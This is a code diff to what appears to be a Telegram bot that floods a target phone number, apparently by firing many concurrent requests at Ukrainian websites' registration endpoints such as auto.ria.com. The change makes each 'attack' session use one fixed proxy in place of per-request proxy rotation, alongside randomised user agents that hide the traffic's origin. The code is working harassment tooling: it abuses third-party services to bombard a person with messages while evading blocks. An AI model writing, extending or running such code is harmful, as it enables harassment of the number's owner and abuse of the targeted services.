@@ -1160,14 +1160,8 @@ async def send_request(url, data=None, json=None, headers=None, method='POST', c
         else:
             raise ValueError(f"Unsupported method {method}")
 
-async def ukr(number, chat_id, proxy_entries=None):
+async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
     headers = {"User-Agent": fake_useragent.UserAgent().random}
-    proxy_cycle = None
-    if proxy_entries:
-        try:
-            proxy_cycle = itertools.cycle(proxy_entries)
-        except Exception:
-            proxy_cycle = None
 
     csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
     try:
@@ -1207,21 +1201,6 @@ async def ukr(number, chat_id, proxy_entries=None):
             logging.error(f"Невідома помилка при запиті до {url}: {e}")
 
     semaphore = asyncio.Semaphore(5)
-    
-    def next_proxy_params():
-        if not proxy_cycle:
-            return None, None
-        try:
-            entry = next(proxy_cycle)
-            # increment usage counters
-            try:
-                key = f"{entry['host']}:{entry['port']}:{entry.get('user','')}"
-                proxies_usage[key] = proxies_usage.get(key, 0) + 1
-            except Exception:
-                pass
-            return build_proxy_params(entry)
-        except Exception:
-            return None, None
 
     async def bounded_request(url, **kwargs):
         if not attack_flags.get(chat_id):
@@ -1229,11 +1208,10 @@ async def ukr(number, chat_id, proxy_entries=None):
         async with semaphore:
             await send_request_and_log(url, **kwargs)
 
-    # Helper builder for per-call proxy rotation
+    # Helper: attach fixed proxy for this iteration
     def with_proxy(kwargs):
-        purl, pauth = next_proxy_params()
-        if purl:
-            kwargs.update({"proxy": purl, "proxy_auth": pauth})
+        if proxy_url:
+            kwargs.update({"proxy": proxy_url, "proxy_auth": proxy_auth})
         return kwargs
 
     tasks = [
@@ -1297,13 +1275,26 @@ async def start_attack(number, chat_id):
     try:
         await check_and_update_proxies()
         snapshot = proxies_healthy.copy()
+        proxy_cycle = itertools.cycle(snapshot) if snapshot else None
+        # choose one proxy for the whole attack session
+        p_url = None
+        p_auth = None
+        if proxy_cycle:
+            try:
+                entry = next(proxy_cycle)
+                key = f"{entry['host']}:{entry['port']}:{entry.get('user','')}"
+                proxies_usage[key] = proxies_usage.get(key, 0) + 1
+                p_url, p_auth = build_proxy_params(entry)
+                logging.info(f"Using proxy for attack: {entry['host']}:{entry['port']}")
+            except Exception:
+                p_url, p_auth = None, None
         while (asyncio.get_event_loop().time() - start_time) < timeout:
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
                 await bot.send_message(chat_id, "🛑 Атака зупинена користувачем.")
                 return
             
-            await ukr(number, chat_id, proxy_entries=snapshot if snapshot else None)
+            await ukr(number, chat_id, proxy_url=p_url, proxy_auth=p_auth)
             
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
